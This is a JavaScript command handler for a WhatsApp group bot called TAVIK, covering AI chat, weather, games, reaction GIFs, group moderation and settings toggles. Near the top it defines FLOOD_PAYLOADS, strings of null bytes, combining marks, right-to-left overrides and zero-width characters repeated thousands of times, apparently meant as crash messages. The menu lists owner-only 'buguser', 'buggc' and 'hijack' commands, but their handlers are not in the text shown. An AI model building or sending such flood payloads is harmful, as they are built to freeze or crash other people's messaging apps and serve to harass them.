'use strict'

const api       = require('./api')
const state     = require('./state')
const utils     = require('./utils')
const cdn       = require('./cdn')
const reactions = require('./reactions')
const { BOT_NAME, BOT_VERSION, OWNER_NAME, OWNER_NUMBER, OWNER_NUMBERS, PREFIX } = require('./config')

// ── Flood payloads ────────────────────────────────────────────
const FLOOD_PAYLOADS = [
    () => '\u0000'.repeat(3000) + '꧔ꦿ'.repeat(1000),
    () => '᷂᷿᷄᷾'.repeat(2000) + '\u202E'.repeat(1000),
    () => '\u200B\u200C\u200D\uFEFF'.repeat(3000),
    () => '𒐫'.repeat(2000) + '\u0000'.repeat(500),
    () => '🔥💥⚡🌀'.repeat(2000),
    () => '\u202E' + 'TAVIK'.repeat(1000) + '\u202C'.repeat(1000),
]

const GIF_ACTIONS = {
    hug:'hug', pat:'pat', slap:'slap', kiss:'kiss', cry:'cry',
    dance:'dance', wave:'wave', wink:'wink', bite:'bite', blush:'blush',
    cuddle:'cuddle', poke:'poke', yeet:'yeet', bonk:'bonk', lick:'lick',
    highfive:'highfive', smile:'smile', happy:'happy', handhold:'handhold',
    nom:'nom', bully:'bully', kill:'kill',
}

const pick   = arr => arr[Math.floor(Math.random() * arr.length)]
const sleep  = ms  => new Promise(r => setTimeout(r, ms))
const digits = str => str?.replace(/[^0-9]/g, '') || ''

function extractTarget(arg = '', quotedParticipant = '') {
    if (!arg && quotedParticipant)
        return quotedParticipant.replace(/@s\.whatsapp\.net/g, '').replace(/[^0-9]/g, '')
    if (arg?.startsWith('@')) return arg.replace('@', '').replace(/[^0-9]/g, '')
    return arg?.replace(/[^0-9]/g, '') || null
}

// ── Levanter-style menu ───────────────────────────────────────
function buildMenu(chatId) {
    const chatbotOn = state.chatbot[chatId] ? 'ON 🟢' : 'OFF 🔴'
    const modeStr   = state.selfMode ? 'Self 🔒' : 'Public 🔓'

    return (
`╭═══ ${BOT_NAME} ═══⊷
┃❃╭──────────────────
┃❃│ Prefix  : ${PREFIX}
┃❃│ Owner   : ${OWNER_NAME}
┃❃│ Version : ${BOT_VERSION}
┃❃│ Mode    : ${modeStr}
┃❃│ Chatbot : ${chatbotOn}
┃❃│ Uptime  : ${utils.getUptime()}
┃❃╰───────────────────
╰══════════════════════⊷

 ╭─❏ 🌐 ɢᴇɴᴇʀᴀʟ ❏
 │ alive  ping  info
 │ credits  owner
 ╰─────────────────

 ╭─❏ 🤖 ᴀɪ & ᴛᴏᴏʟs ❏
 │ ai <question>
 │ codeai <request>
 │ createwebsite <desc>
 │ wiki <topic>
 │ define <word>
 │ weather <city>
 │ calc <math>
 │ qrcode <text>
 │ genpass [length]
 │ time
 │ pint <search>
 │ cat   dog
 ╰─────────────────

 ╭─❏ 🎬 ᴍᴇᴅɪᴀ ❏
 │ tiktok <url>
 │ meme
 │ upscale <url>
 ╰─────────────────

 ╭─❏ 🎮 ɢᴀᴍᴇs & ꜰᴜɴ ❏
 │ dice   coin   8ball
 │ truth  dare
 │ joke   dadjoke
 │ funfact  advice
 │ quote  roast
 │ compliment
 ╰─────────────────

 ╭─❏ 💞 ʀᴇᴀᴄᴛɪᴏɴs ❏
 │ hug  pat  slap  kiss
 │ cry  dance  wave  wink
 │ bite  blush  cuddle
 │ poke  yeet  bonk  lick
 │ highfive  smile  happy
 │ handhold  nom  bully  kill
 │ _Usage: ${PREFIX}hug @number_
 ╰─────────────────

 ╭─❏ 👥 ɢʀᴏᴜᴘ ❏
 │ tagall  hidetag
 │ kick  add  warn
 │ promote  demote
 │ mute  unmute
 │ gcinfo  listadmins
 │ grouplink  resetlink
 │ setgcname  kickall
 │ del
 ╰─────────────────

 ╭─❏ ⚙️ sᴇᴛᴛɪɴɢs ❏
 │ chatbot on/off
 │ autoreply on/off
 │ antilink on/off
 │ antispam on/off
 │ antibadword on/off
 │ antidelete on/off
 │ autoread on/off
 │ autoreact on/off
 │ autotyping on/off
 ╰─────────────────

 ╭─❏ 👑 ᴏᴡɴᴇʀ ᴏɴʟʏ ❏
 │ self  public
 │ addsudo  delsudo
 │ sudolist  sudo
 │ buguser  buggc
 │ stopflood  hijack
 │ banuser
 ╰─────────────────

_💡 Say *tavik* anytime to wake me!_`
    )
}

async function handleCommand(chatId, sender, text, qid, isOwner, isSudo, isGroup, msg, isGroupAdmin = false) {
    const isPrivileged = isOwner || isSudo || isGroupAdmin
    const args  = text.trim().split(/\s+/)
    const cmd   = args[0].toLowerCase()
    const query = args.slice(1).join(' ')
    const quotedParticipant = msg?.message?.extendedTextMessage?.contextInfo?.participant || ''

    // ── MENU ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}menu` || cmd === `${PREFIX}help`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId, buildMenu(chatId), qid)
    }

    // ── GENERAL ──────────────────────────────────────────────
    if (cmd === `${PREFIX}alive`) {
        return api.sendText(chatId,
            `╭═══ ${BOT_NAME} ═══⊷\n` +
            `┃❃│ ✅ BOT IS ALIVE!\n` +
            `┃❃│ ⏳ Uptime  : ${utils.getUptime()}\n` +
            `┃❃│ 👑 Owner   : ${OWNER_NAME}\n` +
            `┃❃│ 🔐 Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            `╰══════════════════════⊷`, qid)
    }

    if (cmd === `${PREFIX}ping`) {
        const t = Date.now()
        return api.sendText(chatId, `🏓 *Pong!*\n⚡ Speed: ${Date.now() - t}ms`, qid)
    }

    if (cmd === `${PREFIX}info`) {
        return api.sendText(chatId,
            `╭─❏ 🤖 ʙᴏᴛ ɪɴꜰᴏ ❏\n` +
            ` │ Name    : ${BOT_NAME}\n` +
            ` │ Version : ${BOT_VERSION}\n` +
            ` │ Owner   : ${OWNER_NAME}\n` +
            ` │ Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            ` │ Uptime  : ${utils.getUptime()}\n` +
            ` │ Host    : Railway\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}credits`) {
        return api.sendText(chatId,
            `╭─❏ 🏆 ᴄʀᴇᴅɪᴛs ❏\n` +
            ` │ Developer : GODSWILL\n` +
            ` │ Bot Name  : ${BOT_NAME}\n` +
            ` │ Version   : ${BOT_VERSION}\n` +
            ` │ Host      : Railway\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}owner`) {
        return api.sendText(chatId,
            `╭─❏ 👑 ᴏᴡɴᴇʀ ❏\n` +
            ` │ Name : ${OWNER_NAME}\n` +
            ` │ 📱 wa.me/${OWNER_NUMBER}\n` +
            ` ╰─────────────────`, qid)
    }

    // ── AI & TOOLS ───────────────────────────────────────────
    if (cmd === `${PREFIX}ai`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}ai <question>*`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId, `╭─❏ 🤖 ᴀɪ ʀᴇᴘʟʏ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}codeai` || cmd === `${PREFIX}code`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}codeai <request>*`, qid)
        await api.sendTyping(chatId, 4)
        const reply = await utils.askCodeAI(query)
        return api.sendText(chatId, `╭─❏ 💻 ᴄᴏᴅᴇ ʀᴇsᴜʟᴛ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}createwebsite` || cmd === `${PREFIX}website`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}createwebsite <description>*`, qid)
        await api.sendTyping(chatId, 5)
        await api.sendText(chatId, `⚡ Building your website... please wait!`, qid)
        const html = await utils.createWebsite(query)
        if (!html) return api.sendText(chatId, `❌ Generation failed. Try a clearer description!`, qid)
        try {
            const buf = Buffer.from(html, 'utf-8')
            const url = await cdn.upload(buf, 'website.html', 'text/html')
            if (url) {
                return api.sendText(chatId,
                    `✅ *Website Ready!*\n📄 Topic: _${query}_\n🔗 Download:\n${url}\n\n_Open in any browser!_`, qid)
            }
        } catch {}
        return api.sendText(chatId, `✅ *Website Generated!*\n\n${html.slice(0, 3500)}`, qid)
    }

    if (cmd === `${PREFIX}wiki`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}wiki <topic>*`, qid)
        await api.sendTyping(chatId, 2)
        const result = await utils.getWiki(query)
        if (!result) return api.sendText(chatId, `❌ Nothing found for "${query}"`, qid)
        return api.sendText(chatId,
            `╭─❏ 📖 ᴡɪᴋɪ ❏\n │ *${query}*\n │\n │ ${result.slice(0, 700).replace(/\n/g, '\n │ ')}...\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}define` || cmd === `${PREFIX}dictionary`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}define <word>*`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getDictionary(query)
        if (!r) return api.sendText(chatId, `❌ No definition found for "${query}"`, qid)
        return api.sendText(chatId,
            `╭─❏ 📚 ᴅᴇꜰɪɴɪᴛɪᴏɴ ❏\n` +
            ` │ *${r.word}* ${r.phonetic}\n` +
            ` │ _(${r.partOfSpeech})_\n` +
            ` │ ${r.definition}\n` +
            ` │ ${r.example ? `💬 _"${r.example}"_` : ''}\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}weather`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}weather <city>*`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getWeather(query)
        if (!r) return api.sendText(chatId, `❌ City not found!`, qid)
        return api.sendText(chatId, `╭─❏ 🌤️ ᴡᴇᴀᴛʜᴇʀ ❏\n │ *${query}*\n │ ${r}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}calculate` || cmd === `${PREFIX}calc`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}calc <expression>*`, qid)
        try {
            const safe = query.replace(/[^0-9+\-*/.()%\s]/g, '')
            if (!safe) return api.sendText(chatId, `❌ Invalid expression!`, qid)
            // eslint-disable-next-line no-new-func
            const result = Function('"use strict"; return (' + safe + ')')()
            if (!isFinite(result)) return api.sendText(chatId, `❌ Math error!`, qid)
            return api.sendText(chatId,
                `╭─❏ 🧮 ᴄᴀʟᴄᴜʟᴀᴛᴏʀ ❏\n │ 📝 ${query}\n │ ✅ = *${result}*\n ╰─────────────────`, qid)
        } catch {
            return api.sendText(chatId, `❌ Invalid expression!`, qid)
        }
    }

    if (cmd === `${PREFIX}time`) {
        const n = new Date()
        return api.sendText(chatId,
            `╭─❏ 🕐 ᴛɪᴍᴇ ❏\n` +
            ` │ 📅 ${n.toDateString()}\n` +
            ` │ ⏰ ${n.toTimeString().split(' ')[0]}\n` +
            ` │ 🌍 ${n.toUTCString()}\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}pint`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}pint <search query>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🔍 Searching images for *${query}*...`, qid)
        const urls = await utils.searchImages(query, 5)
        if (!urls.length) return api.sendText(chatId, `❌ No images found for "${query}"`, qid)
        let sent = 0
        for (const url of urls) {
            try {
                await api.sendImage(chatId, url, sent === 0 ? `🖼️ *${query}* (${urls.length} results)` : '', qid)
                sent++
                await sleep(500)
            } catch {}
        }
        if (!sent) return api.sendText(chatId, `❌ Could not load images. Try a different search.`, qid)
        return
    }

    if (cmd === `${PREFIX}qrcode` || cmd === `${PREFIX}qr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}qrcode <text or URL>*`, qid)
        const url = utils.getQRCode(query)
        return api.sendImage(chatId, url, `📱 *QR Code*\n📝 ${query}`, qid)
    }

    if (cmd === `${PREFIX}genpass`) {
        const len  = Math.min(parseInt(args[1]) || 16, 64)
        const pass = utils.generatePassword(len)
        return api.sendText(chatId,
            `╭─❏ 🔐 ᴘᴀssᴡᴏʀᴅ ❏\n │ \`${pass}\`\n │ 📏 ${len} characters\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}cat`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getCatImage()
        if (!url) return api.sendText(chatId, `❌ Could not fetch a cat!`, qid)
        return api.sendImage(chatId, url, `🐱 *Meow!*`, qid)
    }

    if (cmd === `${PREFIX}dog`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getDogImage()
        if (!url) return api.sendText(chatId, `❌ Could not fetch a dog!`, qid)
        return api.sendImage(chatId, url, `🐶 *Woof!*`, qid)
    }

    if (cmd === `${PREFIX}tiktok`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}tiktok <url>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `⬇️ Downloading TikTok...`, qid)
        const videoUrl = await utils.downloadTiktok(query)
        if (!videoUrl) return api.sendText(chatId, `❌ Failed! Invalid or expired link.`, qid)
        return api.sendVideo(chatId, videoUrl, `✅ Downloaded!`, qid)
    }

    if (cmd === `${PREFIX}meme`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getMeme()
        if (!url) return api.sendText(chatId, `❌ No meme found. Try again!`, qid)
        return api.sendImage(chatId, url, `😂 *Random Meme!*`, qid)
    }

    if (cmd === `${PREFIX}upscale`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}upscale <image_url>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🔍 Upscaling image... please wait ⏳`, qid)
        const outUrl = await utils.upscaleImage(query)
        if (outUrl) return api.sendImage(chatId, outUrl, `✅ *Upscaled (2x)!*`, qid)
        return api.sendText(chatId, `❌ Upscale failed. Use a direct image link (jpg/png).`, qid)
    }

    if (cmd === `${PREFIX}del` && isPrivileged) {
        const quotedMsgId = msg?.message?.extendedTextMessage?.contextInfo?.stanzaId
        if (!quotedMsgId) return api.sendText(chatId, `❌ Reply to a message with *${PREFIX}del* to delete it.`, qid)
        await api.deleteMessage(chatId, quotedMsgId)
        return
    }

    // ── FUN & GAMES ───────────────────────────────────────────
    if (cmd === `${PREFIX}dice`) {
        const r = Math.floor(Math.random() * 6) + 1
        const f = ['','1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣']
        return api.sendText(chatId,
            `╭─❏ 🎲 ᴅɪᴄᴇ ʀᴏʟʟ ❏\n │ You rolled *${f[r]} ${r}*!\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}coin`) {
        return api.sendText(chatId,
            `╭─❏ 🪙 ᴄᴏɪɴ ꜰʟɪᴘ ❏\n │ *${Math.random() < 0.5 ? 'HEADS 🦅' : 'TAILS 🪙'}*\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}8ball`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}8ball <question>*`, qid)
        const a = ['✅ Yes!','✅ Definitely!','✅ Without a doubt!','⚠️ Maybe...','⚠️ Ask again later','❌ No.','❌ Definitely not!','❌ Very doubtful']
        return api.sendText(chatId,
            `╭─❏ 🎱 8 ʙᴀʟʟ ❏\n │ ❓ ${query}\n │ ${pick(a)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}truth`) {
        const t = [
            'What is your biggest fear?', 'Have you ever lied to your best friend?',
            "What's your most embarrassing moment?", 'Do you have a crush?',
            "What's the worst thing you've done?", 'Have you ever cheated in an exam?',
            "What's your biggest secret?", 'Who do you miss the most right now?',
        ]
        return api.sendText(chatId,
            `╭─❏ 🤫 ᴛʀᴜᴛʜ ❏\n │ ${pick(t)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}dare`) {
        const d = [
            'Send a voice note singing a song!',
            'Change your status to "This bot is the best!" for 1 hour!',
            'Send your most embarrassing photo!',
            'Do 10 pushups and send proof!',
            "Text someone you haven't talked to in a year!",
        ]
        return api.sendText(chatId,
            `╭─❏ 😈 ᴅᴀʀᴇ ❏\n │ ${pick(d)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}joke`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 😂 ᴊᴏᴋᴇ ❏\n │ ${await utils.getJoke()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}dadjoke`) {
        await api.sendTyping(chatId, 1)
        const j = await utils.getDadJoke()
        if (!j) return api.sendText(chatId, `❌ No dad joke available!`, qid)
        return api.sendText(chatId,
            `╭─❏ 👨 ᴅᴀᴅ ᴊᴏᴋᴇ ❏\n │ ${j}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}funfact`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 🤯 ꜰᴜɴ ꜰᴀᴄᴛ ❏\n │ ${await utils.getFunFact()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}advice`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 💡 ᴀᴅᴠɪᴄᴇ ❏\n │ ${await utils.getAdvice()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}quote`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 💭 ǫᴜᴏᴛᴇ ❏\n │ ${await utils.getQuote()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}roast`) {
        const r = [
            'You are the reason shampoos have instructions.',
            "I'd agree with you but then we'd both be wrong.",
            'You bring everyone joy when you leave the room.',
            "I'd roast you but my mama said not to burn trash.",
        ]
        const target = args[1] ? `@${args[1].replace('@','')}` : 'you'
        return api.sendText(chatId,
            `╭─❏ 🔥 ʀᴏᴀsᴛ ꜰᴏʀ ${target} ❏\n │ ${pick(r)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}compliment`) {
        const c = [
            'You have an amazing sense of humor!', 'You are genuinely a great person!',
            'You make everyone around you feel special!', 'You are stronger than you think!',
            'The world is better with you in it!',
        ]
        const target = args[1] ? `@${args[1].replace('@','')}` : 'you'
        return api.sendText(chatId,
            `╭─❏ 💝 ᴄᴏᴍᴘʟɪᴍᴇɴᴛ ꜰᴏʀ ${target} ❏\n │ ${pick(c)}\n ╰─────────────────`, qid)
    }

    // ── REACTIONS ─────────────────────────────────────────────
    const reactionKey = cmd.slice(PREFIX.length)
    if (GIF_ACTIONS[reactionKey] !== undefined || reactions[reactionKey] !== undefined) {
        const rawTarget = args[1] || ''
        const emoji     = reactions[reactionKey] || '✨'
        let displayTarget = 'everyone'
        if (rawTarget && rawTarget !== 'all' && rawTarget !== '@all') {
            const num = rawTarget.replace('@', '').replace(/[^0-9]/g, '')
            displayTarget = num ? `@${num}` : rawTarget
        }
        await api.sendTyping(chatId, 1)
        const gifUrl  = GIF_ACTIONS[reactionKey] ? await utils.getReactionGif(GIF_ACTIONS[reactionKey]) : null
        const caption = `${emoji} *@${sender}* ${reactionKey}s *${displayTarget}*! ${emoji}`
        if (gifUrl) return api.sendImage(chatId, gifUrl, caption, qid)
        return api.sendText(chatId, caption, qid)
    }

    // ── SUDO MANAGEMENT ──────────────────────────────────────
    if (cmd === `${PREFIX}sudo`) {
        if (!isOwner && !isSudo)
            return api.sendText(chatId,
                `❌ *Not privileged!*\n\nAsk the owner:\n*${PREFIX}addsudo <your number>*\n\nOwner: wa.me/${OWNER_NUMBER}`, qid)
        return api.sendText(chatId,
            `✅ *Access Confirmed!*\n🔑 Level: ${isOwner ? 'Owner 👑' : 'Sudo ⚡'}\n📱 ${sender}`, qid)
    }

    if (cmd === `${PREFIX}sudolist`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.sudoUsers.length)
            return api.sendText(chatId, `📋 No sudo users yet.\n\nAdd one: *${PREFIX}addsudo <number>*`, qid)
        return api.sendText(chatId,
            `╭─❏ 👥 sᴜᴅᴏ ʟɪsᴛ ❏\n` +
            state.sudoUsers.map((n, i) => ` │ ${i + 1}. +${n}`).join('\n') +
            `\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}addsudo` && isOwner) {
        const num = extractTarget(args[1], quotedParticipant)
        if (!num) return api.sendText(chatId,
            `❌ *Add sudo:*\n\n1. *${PREFIX}addsudo 234xxxxxxxxx*\n2. Reply to message + *${PREFIX}addsudo*`, qid)
        if (state.sudoUsers.includes(num))
            return api.sendText(chatId, `⚠️ *${num}* is already sudo!`, qid)
        state.sudoUsers.push(num)
        return api.sendText(chatId, `✅ *${num}* added as sudo!`, qid)
    }

    if (cmd === `${PREFIX}delsudo` && isOwner) {
        const num = extractTarget(args[1], quotedParticipant)
        if (!num) return api.sendText(chatId,
            `❌ *Remove sudo:*\n\n1. *${PREFIX}delsudo 234xxxxxxxxx*\n2. Reply to message + *${PREFIX}delsudo*`, qid)
        const before = state.sudoUsers.length
        state.sudoUsers = state.sudoUsers.filter(n => n !== num)
        if (state.sudoUsers.length === before)
            return api.sendText(chatId, `⚠️ *${num}* is not in sudo list.`, qid)
        return api.sendText(chatId, `✅ *${num}* removed from sudo!`, qid)
    }

    // ── GROUP COMMANDS ────────────────────────────────────────
    if (cmd === `${PREFIX}tagall` && isGroup) {
        if (!isOwner && !isSudo && !isGroupAdmin)
            return api.sendText(chatId, `❌ *Admins only!*\nOnly admins, sudo or owner can use this.`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const tags = info.participants?.map(p => `@${p.id.split('@')[0]}`).join(' ') || ''
        return api.sendText(chatId, `📢 *${query || 'Attention everyone!'}*\n\n${tags}`, qid)
    }

    if (cmd === `${PREFIX}hidetag` && isGroup && isPrivileged) {
        return api.sendText(chatId, query || '📢', qid)
    }

    if (cmd === `${PREFIX}kick` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .kick <number> or reply to message`, qid)
        await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* kicked!`, qid)
    }

    if (cmd === `${PREFIX}add` && isGroup && isPrivileged) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .add <number>`, qid)
        await api.addGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* added!`, qid)
    }

    if (cmd === `${PREFIX}promote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .promote <number> or reply`, qid)
        await api.promoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* promoted to admin!`, qid)
    }

    if (cmd === `${PREFIX}demote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .demote <number> or reply`, qid)
        await api.demoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* demoted!`, qid)
    }

    if (cmd === `${PREFIX}mute` && isGroup && isPrivileged) {
        await api.request('patch', `/groups/${chatId}/settings`, { messaging_disabled: true })
        return api.sendText(chatId, `🔇 Group muted! Only admins can send messages.`, qid)
    }

    if (cmd === `${PREFIX}unmute` && isGroup && isPrivileged) {
        await api.request('patch', `/groups/${chatId}/settings`, { messaging_disabled: false })
        return api.sendText(chatId, `🔊 Group unmuted! Everyone can send messages.`, qid)
    }

    if (cmd === `${PREFIX}gcinfo` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const admins = info.participants?.filter(p => p.rank === 'admin').length || 0
        return api.sendText(chatId,
            `╭─❏ 📊 ɢʀᴏᴜᴘ ɪɴꜰᴏ ❏\n` +
            ` │ 📛 ${info.name || 'Unknown'}\n` +
            ` │ 👥 Members : ${info.participants?.length || 0}\n` +
            ` │ 👑 Admins  : ${admins}\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}listadmins` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const admins = info.participants?.filter(p => p.rank === 'admin') || []
        if (!admins.length) return api.sendText(chatId, `⚠️ No admins found!`, qid)
        return api.sendText(chatId,
            `╭─❏ 👑 ᴀᴅᴍɪɴs (${admins.length}) ❏\n` +
            admins.map(a => ` │ • @${a.id.split('@')[0]}`).join('\n') +
            `\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}setgcname` && isGroup && isPrivileged) {
        if (!query) return api.sendText(chatId, `❌ Usage: .setgcname <name>`, qid)
        await api.request('patch', `/groups/${chatId}`, { name: query })
        return api.sendText(chatId, `✅ Group renamed to *${query}*`, qid)
    }

    if (cmd === `${PREFIX}grouplink` && isGroup && isPrivileged) {
        const info = await api.getGroupInfo(chatId)
        if (!info?.invite) return api.sendText(chatId, `❌ Could not get link!`, qid)
        return api.sendText(chatId, `🔗 *Invite Link*\n\nhttps://chat.whatsapp.com/${info.invite}`, qid)
    }

    if (cmd === `${PREFIX}resetlink` && isGroup && isPrivileged) {
        const res = await api.request('delete', `/groups/${chatId}/invite`)
        if (!res?.invite) return api.sendText(chatId, `❌ Failed to reset link!`, qid)
        return api.sendText(chatId, `✅ *New Link*\n\nhttps://chat.whatsapp.com/${res.invite}`, qid)
    }

    if (cmd === `${PREFIX}kickall` && isGroup && isOwner) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const members = info.participants
            ?.filter(p => p.rank !== 'admin' && !OWNER_NUMBERS.some(o => p.id.includes(o)))
            .map(p => p.id) || []
        if (!members.length) return api.sendText(chatId, `⚠️ No members to kick!`, qid)
        await api.sendText(chatId, `⚡ Kicking ${members.length} members...`, qid)
        for (let i = 0; i < members.length; i += 5) {
            await api.removeGroupParticipants(chatId, members.slice(i, i + 5))
            await sleep(1000)
        }
        return api.sendText(chatId, `✅ Done! Kicked ${members.length} members.`, qid)
    }

    if (cmd === `${PREFIX}warn` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .warn <number> or reply`, qid)
        if (!state.warnings) state.warnings = {}
        const key = `${chatId}_${target}`
        state.warnings[key] = (state.warnings[key] || 0) + 1
        const count = state.warnings[key]
        if (count >= 3) {
            await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
            state.warnings[key] = 0
            return api.sendText(chatId, `🚫 @${target} has been *kicked* after 3 warnings!`, qid)
        }
        return api.sendText(chatId,
            `⚠️ *Warning ${count}/3* for @${target}\n${query || 'Please follow group rules!'}\n\n_3 warnings = kick_`, qid)
    }

    // ── SETTINGS ─────────────────────────────────────────────
    if (cmd === `${PREFIX}chatbot`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized! Only admins/owner can toggle chatbot.`, qid)
        const enable = args[1]?.toLowerCase() === 'on'
        state.chatbot[chatId] = enable
        if (state.chatbotRate[chatId]) delete state.chatbotRate[chatId]
        return api.sendText(chatId,
            `🤖 *Chatbot:* ${enable
                ? 'ON ✅\nBot will reply to every message here!'
                : 'OFF ❌\nBot only responds to commands now.'}`, qid)
    }

    if (cmd === `${PREFIX}autoreply`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreply[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤖 Auto Reply: *${state.autoreply[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antidelete`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.antiDelete[chatId]) state.antiDelete[chatId] = {}
        state.antiDelete[chatId].enabled = args[1] === 'on'
        return api.sendText(chatId, `🗑️ Anti Delete: *${state.antiDelete[chatId].enabled ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antibadword`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antibadword[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤬 Anti Bad Word: *${state.antibadword[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}autoread`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoread = args[1] === 'on'
        return api.sendText(chatId, `👁️ Auto Read: *${state.autoread ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}autoreact`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreact = args[1] === 'on'
        return api.sendText(chatId, `❤️ Auto React: *${state.autoreact ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}autotyping`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autotyping = args[1] === 'on'
        return api.sendText(chatId, `⌨️ Auto Typing: *${state.autotyping ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antilink`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antilink[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🔗 Anti Link: *${state.antilink[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antispam`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antispam[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🚫 Anti Spam: *${state.antispam[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

